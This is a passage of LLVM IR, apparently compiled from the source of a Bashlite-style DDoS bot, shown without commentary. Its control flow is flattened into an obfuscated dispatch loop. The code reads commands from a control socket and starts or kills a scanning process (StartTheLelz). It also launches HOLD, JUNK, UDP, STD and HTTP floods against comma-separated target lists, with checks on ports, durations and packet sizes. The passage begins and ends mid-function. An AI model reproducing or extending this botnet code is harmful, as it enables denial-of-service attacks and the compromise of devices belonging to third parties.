  store i32 %80, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = call i32 (i32, i8*, ...) @sockprintf(i32 %82, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.71, i32 0, i32 0))
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8**, i8*** %4, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 1
  %87 = load i8*, i8** %86, align 8
  %88 = call i32 @strcmp(i8* %87, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.72, i32 0, i32 0)) #10
  %89 = icmp ne i32 %88, 0
  %90 = select i1 %89, i32 -222738703, i32 -2068934320
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* @scanPid, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 -383299981, i32 1906785941
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @scanPid, align 4
  %98 = call i32 @kill(i32 %97, i32 9) #2
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i32 (i32, i8*, ...) @sockprintf(i32 %99, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  store i32 -222738703, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 1
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @strcmp(i8* %104, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.74, i32 0, i32 0)) #10
  %106 = icmp ne i32 %105, 0
  %107 = select i1 %106, i32 875759363, i32 -983928457
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* @scanPid, align 4
  %110 = icmp ne i32 %109, 0
  %111 = select i1 %110, i32 -1536299738, i32 1813299149
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = call i32 @fork() #2
  store i32 %114, i32* %6, align 4
  %115 = load i32, i32* %6, align 4
  %116 = icmp ugt i32 %115, 0
  %117 = select i1 %116, i32 1384997178, i32 744682396
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %6, align 4
  store i32 %119, i32* @scanPid, align 4
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %6, align 4
  %122 = icmp eq i32 %121, -1
  %123 = select i1 %122, i32 119568558, i32 -1997189248
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  store i32 -1609373286, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* @mainCommSock, align 4
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %127, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i32 0, i32 0))
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:129:                                    ; preds = %loopEntry
  store i32 253137193, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 0
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @strcmp(i8* %133, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0)) #10
  %135 = icmp ne i32 %134, 0
  %136 = select i1 %135, i32 1766984258, i32 1231901761
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %3, align 4
  %139 = icmp slt i32 %138, 4
  %140 = select i1 %139, i32 16254396, i32 -2085441607
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i8**, i8*** %4, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 2
  %144 = load i8*, i8** %143, align 8
  %145 = call i32 @atoi(i8* %144) #10
  %146 = icmp slt i32 %145, 1
  %147 = select i1 %146, i32 16254396, i32 1668949539
  store i32 %147, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i8**, i8*** %4, align 8
  %150 = getelementptr inbounds i8*, i8** %149, i64 3
  %151 = load i8*, i8** %150, align 8
  %152 = call i32 @atoi(i8* %151) #10
  %153 = icmp slt i32 %152, 1
  %154 = select i1 %153, i32 16254396, i32 375313365
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i8**, i8*** %4, align 8
  %158 = getelementptr inbounds i8*, i8** %157, i64 1
  %159 = load i8*, i8** %158, align 8
  store i8* %159, i8** %7, align 8
  %160 = load i8**, i8*** %4, align 8
  %161 = getelementptr inbounds i8*, i8** %160, i64 2
  %162 = load i8*, i8** %161, align 8
  %163 = call i32 @atoi(i8* %162) #10
  store i32 %163, i32* %8, align 4
  %164 = load i8**, i8*** %4, align 8
  %165 = getelementptr inbounds i8*, i8** %164, i64 3
  %166 = load i8*, i8** %165, align 8
  %167 = call i32 @atoi(i8* %166) #10
  store i32 %167, i32* %9, align 4
  %168 = load i8*, i8** %7, align 8
  %169 = call i8* @strstr(i8* %168, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %170 = icmp ne i8* %169, null
  %171 = select i1 %170, i32 -1079013532, i32 1081120292
  store i32 %171, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i8*, i8** %7, align 8
  %174 = call i8* @strtok(i8* %173, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %174, i8** %10, align 8
  store i32 -1412049000, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8*, i8** %10, align 8
  %177 = icmp ne i8* %176, null
  %178 = select i1 %177, i32 481821855, i32 289043547
  store i32 %178, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = call i32 @listFork()
  %181 = icmp ne i32 %180, 0
  %182 = select i1 %181, i32 -504876059, i32 652172429
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8*, i8** %10, align 8
  %185 = load i32, i32* %8, align 4
  %186 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %184, i32 %185, i32 %186)
  call void @_exit(i32 0) #12
  unreachable

; <label>:187:                                    ; preds = %loopEntry
  %188 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %188, i8** %10, align 8
  store i32 -1412049000, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -12799566, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = call i32 @listFork()
  %192 = icmp ne i32 %191, 0
  %193 = select i1 %192, i32 208771550, i32 544235776
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8*, i8** %7, align 8
  %197 = load i32, i32* %8, align 4
  %198 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %196, i32 %197, i32 %198)
  call void @_exit(i32 0) #12
  unreachable

; <label>:199:                                    ; preds = %loopEntry
  store i32 1766984258, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i8**, i8*** %4, align 8
  %202 = getelementptr inbounds i8*, i8** %201, i64 0
  %203 = load i8*, i8** %202, align 8
  %204 = call i32 @strcmp(i8* %203, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0)) #10
  %205 = icmp ne i32 %204, 0
  %206 = select i1 %205, i32 -837649149, i32 -1968395227
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i32, i32* %3, align 4
  %209 = icmp slt i32 %208, 4
  %210 = select i1 %209, i32 2007174185, i32 -1031524394
  store i32 %210, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i8**, i8*** %4, align 8
  %213 = getelementptr inbounds i8*, i8** %212, i64 2
  %214 = load i8*, i8** %213, align 8
  %215 = call i32 @atoi(i8* %214) #10
  %216 = icmp slt i32 %215, 1
  %217 = select i1 %216, i32 2007174185, i32 -951540168
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i8**, i8*** %4, align 8
  %220 = getelementptr inbounds i8*, i8** %219, i64 3
  %221 = load i8*, i8** %220, align 8
  %222 = call i32 @atoi(i8* %221) #10
  %223 = icmp slt i32 %222, 1
  %224 = select i1 %223, i32 2007174185, i32 2007493097
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 1
  %229 = load i8*, i8** %228, align 8
  store i8* %229, i8** %11, align 8
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 2
  %232 = load i8*, i8** %231, align 8
  %233 = call i32 @atoi(i8* %232) #10
  store i32 %233, i32* %12, align 4
  %234 = load i8**, i8*** %4, align 8
  %235 = getelementptr inbounds i8*, i8** %234, i64 3
  %236 = load i8*, i8** %235, align 8
  %237 = call i32 @atoi(i8* %236) #10
  store i32 %237, i32* %13, align 4
  %238 = load i8*, i8** %11, align 8
  %239 = call i8* @strstr(i8* %238, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %240 = icmp ne i8* %239, null
  %241 = select i1 %240, i32 -1750620499, i32 -164726242
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8*, i8** %11, align 8
  %244 = call i8* @strtok(i8* %243, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %244, i8** %14, align 8
  store i32 -575530817, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i8*, i8** %14, align 8
  %247 = icmp ne i8* %246, null
  %248 = select i1 %247, i32 2144772400, i32 -1238981734
  store i32 %248, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = call i32 @listFork()
  %251 = icmp ne i32 %250, 0
  %252 = select i1 %251, i32 -896815630, i32 -1690452654
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i8*, i8** %14, align 8
  %255 = load i32, i32* %12, align 4
  %256 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %254, i32 %255, i32 %256)
  %257 = load i32, i32* @mainCommSock, align 4
  %258 = call i32 @close(i32 %257)
  call void @_exit(i32 0) #12
  unreachable

; <label>:259:                                    ; preds = %loopEntry
  %260 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %260, i8** %14, align 8
  store i32 -575530817, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 1947349908, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @listFork()
  %264 = icmp ne i32 %263, 0
  %265 = select i1 %264, i32 -4956546, i32 1826388650
  store i32 %265, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8*, i8** %11, align 8
  %269 = load i32, i32* %12, align 4
  %270 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %268, i32 %269, i32 %270)
  call void @_exit(i32 0) #12
  unreachable

; <label>:271:                                    ; preds = %loopEntry
  store i32 -837649149, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = load i8**, i8*** %4, align 8
  %274 = getelementptr inbounds i8*, i8** %273, i64 0
  %275 = load i8*, i8** %274, align 8
  %276 = call i32 @strcmp(i8* %275, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i32 0, i32 0)) #10
  %277 = icmp ne i32 %276, 0
  %278 = select i1 %277, i32 -988998933, i32 409622102
  store i32 %278, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i32, i32* %3, align 4
  %281 = icmp slt i32 %280, 6
  %282 = select i1 %281, i32 1431258748, i32 1681263931
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8**, i8*** %4, align 8
  %285 = getelementptr inbounds i8*, i8** %284, i64 3
  %286 = load i8*, i8** %285, align 8
  %287 = call i32 @atoi(i8* %286) #10
  %288 = icmp eq i32 %287, -1
  %289 = select i1 %288, i32 1431258748, i32 -715583431
  store i32 %289, i32* %switchVar
  br label %loopEnd

; <label>:290:                                    ; preds = %loopEntry
  %291 = load i8**, i8*** %4, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 2
  %293 = load i8*, i8** %292, align 8
  %294 = call i32 @atoi(i8* %293) #10
  %295 = icmp eq i32 %294, -1
  %296 = select i1 %295, i32 1431258748, i32 810941502
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 4
  %300 = load i8*, i8** %299, align 8
  %301 = call i32 @atoi(i8* %300) #10
  %302 = icmp eq i32 %301, -1
  %303 = select i1 %302, i32 1431258748, i32 -899572219
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 5
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* %307) #10
  %309 = icmp eq i32 %308, -1
  %310 = select i1 %309, i32 1431258748, i32 1860695492
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 5
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @atoi(i8* %314) #10
  %316 = icmp sgt i32 %315, 65500
  %317 = select i1 %316, i32 1431258748, i32 -1583944002
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i8**, i8*** %4, align 8
  %320 = getelementptr inbounds i8*, i8** %319, i64 4
  %321 = load i8*, i8** %320, align 8
  %322 = call i32 @atoi(i8* %321) #10
  %323 = icmp sgt i32 %322, 32
  %324 = select i1 %323, i32 1431258748, i32 -519571725
  store i32 %324, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %326 = load i32, i32* %3, align 4
  %327 = icmp eq i32 %326, 7
  %328 = select i1 %327, i32 -1533159125, i32 2066194504
  store i32 %328, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 6
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #10
  %334 = icmp slt i32 %333, 1
  %335 = select i1 %334, i32 1431258748, i32 2066194504
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i8**, i8*** %4, align 8
  %339 = getelementptr inbounds i8*, i8** %338, i64 1
  %340 = load i8*, i8** %339, align 8
  store i8* %340, i8** %15, align 8
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 2
  %343 = load i8*, i8** %342, align 8
  %344 = call i32 @atoi(i8* %343) #10
  store i32 %344, i32* %16, align 4
  %345 = load i8**, i8*** %4, align 8
  %346 = getelementptr inbounds i8*, i8** %345, i64 3
  %347 = load i8*, i8** %346, align 8
  %348 = call i32 @atoi(i8* %347) #10
  store i32 %348, i32* %17, align 4
  %349 = load i8**, i8*** %4, align 8
  %350 = getelementptr inbounds i8*, i8** %349, i64 4
  %351 = load i8*, i8** %350, align 8
  %352 = call i32 @atoi(i8* %351) #10
  store i32 %352, i32* %18, align 4
  %353 = load i8**, i8*** %4, align 8
  %354 = getelementptr inbounds i8*, i8** %353, i64 5
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @atoi(i8* %355) #10
  store i32 %356, i32* %19, align 4
  %357 = load i32, i32* %3, align 4
  %358 = icmp eq i32 %357, 7
  %359 = select i1 %358, i32 -462948125, i32 1309119246
  store i32 %359, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i8**, i8*** %4, align 8
  %362 = getelementptr inbounds i8*, i8** %361, i64 6
  %363 = load i8*, i8** %362, align 8
  %364 = call i32 @atoi(i8* %363) #10
  store i32 27030110, i32* %switchVar
  store i32 %364, i32* %.reg2mem2
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  store i32 27030110, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %20, align 4
  %367 = load i8*, i8** %15, align 8
  %368 = call i8* @strstr(i8* %367, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %369 = icmp ne i8* %368, null
  %370 = select i1 %369, i32 -643380023, i32 144791630
  store i32 %370, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i8*, i8** %15, align 8
  %373 = call i8* @strtok(i8* %372, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %373, i8** %21, align 8
  store i32 -987719410, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i8*, i8** %21, align 8
  %376 = icmp ne i8* %375, null
  %377 = select i1 %376, i32 1249180597, i32 286009288
  store i32 %377, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = call i32 @listFork()
  %380 = icmp ne i32 %379, 0
  %381 = select i1 %380, i32 -1307175177, i32 -1001277038
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i8*, i8** %21, align 8
  %384 = load i32, i32* %16, align 4
  %385 = load i32, i32* %17, align 4
  %386 = load i32, i32* %18, align 4
  %387 = load i32, i32* %19, align 4
  %388 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %383, i32 %384, i32 %385, i32 %386, i32 %387, i32 %388)
  call void @_exit(i32 0) #12
  unreachable

; <label>:389:                                    ; preds = %loopEntry
  %390 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %390, i8** %21, align 8
  store i32 -987719410, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  store i32 213562977, i32* %switchVar
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  %393 = call i32 @listFork()
  %394 = icmp ne i32 %393, 0
  %395 = select i1 %394, i32 2077741790, i32 -2096551599
  store i32 %395, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = load i8*, i8** %15, align 8
  %399 = load i32, i32* %16, align 4
  %400 = load i32, i32* %17, align 4
  %401 = load i32, i32* %18, align 4
  %402 = load i32, i32* %19, align 4
  %403 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %398, i32 %399, i32 %400, i32 %401, i32 %402, i32 %403)
  call void @_exit(i32 0) #12
  unreachable

; <label>:404:                                    ; preds = %loopEntry
  store i32 -988998933, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = load i8**, i8*** %4, align 8
  %407 = getelementptr inbounds i8*, i8** %406, i64 0
  %408 = load i8*, i8** %407, align 8
  %409 = call i32 @strcmp(i8* %408, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i32 0, i32 0)) #10
  %410 = icmp ne i32 %409, 0
  %411 = select i1 %410, i32 1065345409, i32 -1428153485
  store i32 %411, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i32, i32* %3, align 4
  %414 = icmp slt i32 %413, 4
  %415 = select i1 %414, i32 1717673958, i32 202533588
  store i32 %415, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load i8**, i8*** %4, align 8
  %418 = getelementptr inbounds i8*, i8** %417, i64 2
  %419 = load i8*, i8** %418, align 8
  %420 = call i32 @atoi(i8* %419) #10
  %421 = icmp slt i32 %420, 1
  %422 = select i1 %421, i32 1717673958, i32 153330386
  store i32 %422, i32* %switchVar
  br label %loopEnd

; <label>:423:                                    ; preds = %loopEntry
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 3
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @atoi(i8* %426) #10
  %428 = icmp slt i32 %427, 1
  %429 = select i1 %428, i32 1717673958, i32 435407319
  store i32 %429, i32* %switchVar
  br label %loopEnd

; <label>:430:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 1
  %434 = load i8*, i8** %433, align 8
  store i8* %434, i8** %22, align 8
  %435 = load i8**, i8*** %4, align 8
  %436 = getelementptr inbounds i8*, i8** %435, i64 2
  %437 = load i8*, i8** %436, align 8
  %438 = call i32 @atoi(i8* %437) #10
  store i32 %438, i32* %23, align 4
  %439 = load i8**, i8*** %4, align 8
  %440 = getelementptr inbounds i8*, i8** %439, i64 3
  %441 = load i8*, i8** %440, align 8
  %442 = call i32 @atoi(i8* %441) #10
  store i32 %442, i32* %24, align 4
  %443 = load i8*, i8** %22, align 8
  %444 = call i8* @strstr(i8* %443, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %445 = icmp ne i8* %444, null
  %446 = select i1 %445, i32 454293354, i32 -1824599835
  store i32 %446, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  %448 = load i8*, i8** %22, align 8
  %449 = call i8* @strtok(i8* %448, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %449, i8** %25, align 8
  store i32 -621049251, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i8*, i8** %25, align 8
  %452 = icmp ne i8* %451, null
  %453 = select i1 %452, i32 -1265249496, i32 550383243
  store i32 %453, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = call i32 @listFork()
  %456 = icmp ne i32 %455, 0
  %457 = select i1 %456, i32 1470493211, i32 -1462372762
  store i32 %457, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = load i8*, i8** %25, align 8
  %460 = load i32, i32* %23, align 4
  %461 = load i32, i32* %24, align 4
  call void @sendSTD(i8* %459, i32 %460, i32 %461)
  call void @_exit(i32 0) #12
  unreachable

; <label>:462:                                    ; preds = %loopEntry
  %463 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %463, i8** %25, align 8
  store i32 -621049251, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  store i32 1607253544, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  %466 = call i32 @listFork()
  %467 = icmp ne i32 %466, 0
  %468 = select i1 %467, i32 1630946879, i32 365831904
  store i32 %468, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:470:                                    ; preds = %loopEntry
  %471 = load i8*, i8** %22, align 8
  %472 = load i32, i32* %23, align 4
  %473 = load i32, i32* %24, align 4
  call void @sendSTD(i8* %471, i32 %472, i32 %473)
  call void @_exit(i32 0) #12
  unreachable

; <label>:474:                                    ; preds = %loopEntry
  store i32 1065345409, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  %476 = load i8**, i8*** %4, align 8
  %477 = getelementptr inbounds i8*, i8** %476, i64 0
  %478 = load i8*, i8** %477, align 8
  %479 = call i32 @strcmp(i8* %478, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.80, i32 0, i32 0)) #10
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 -1008405830, i32 -1001191415
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i32, i32* %3, align 4
  %484 = icmp slt i32 %483, 3
  %485 = select i1 %484, i32 -1871982983, i32 -752475510
  store i32 %485, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  %487 = load i8**, i8*** %4, align 8
  %488 = getelementptr inbounds i8*, i8** %487, i64 2
  %489 = load i8*, i8** %488, align 8
  %490 = call i32 @atoi(i8* %489) #10
  %491 = icmp slt i32 %490, 1
  %492 = select i1 %491, i32 -1871982983, i32 1738279267
  store i32 %492, i32* %switchVar
  br label %loopEnd

; <label>:493:                                    ; preds = %loopEntry
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load i8**, i8*** %4, align 8
  %496 = getelementptr inbounds i8*, i8** %495, i64 1
  %497 = load i8*, i8** %496, align 8
  store i8* %497, i8** %26, align 8
  %498 = load i8**, i8*** %4, align 8
  %499 = getelementptr inbounds i8*, i8** %498, i64 2
  %500 = load i8*, i8** %499, align 8
  %501 = call i32 @atoi(i8* %500) #10
  store i32 %501, i32* %27, align 4
  %502 = load i8*, i8** %26, align 8
  %503 = call i8* @strstr(i8* %502, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %504 = icmp ne i8* %503, null
  %505 = select i1 %504, i32 -957772299, i32 -2009164037
  store i32 %505, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i8*, i8** %26, align 8
  %508 = call i8* @strtok(i8* %507, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %508, i8** %28, align 8
  store i32 -360869093, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load i8*, i8** %28, align 8
  %511 = icmp ne i8* %510, null
  %512 = select i1 %511, i32 -1733118468, i32 824547179
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = call i32 @listFork()
  %515 = icmp ne i32 %514, 0
  %516 = select i1 %515, i32 204427369, i32 528659750
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i32 -1140196367, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = load i32, i32* %29, align 4
  %520 = icmp slt i32 %519, 10
  %521 = select i1 %520, i32 -771218290, i32 656010877
  store i32 %521, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  %523 = load i8*, i8** %26, align 8
  %524 = load i32, i32* %27, align 4
  call void @sendHTTP(i8* %523, i32 %524)
  %525 = load i32, i32* %29, align 4
  %526 = add nsw i32 %525, 1
  store i32 %526, i32* %29, align 4
  store i32 -1140196367, i32* %switchVar
  br label %loopEnd

; <label>:527:                                    ; preds = %loopEntry
  %528 = load i32, i32* @mainCommSock, align 4
  %529 = call i32 @close(i32 %528)
  call void @_exit(i32 0) #12
  unreachable

; <label>:530:                                    ; preds = %loopEntry
  %531 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %531, i8** %28, align 8
  store i32 -360869093, i32* %switchVar
  br label %loopEnd

; <label>:532:                                    ; preds = %loopEntry
  store i32 1288991404, i32* %switchVar
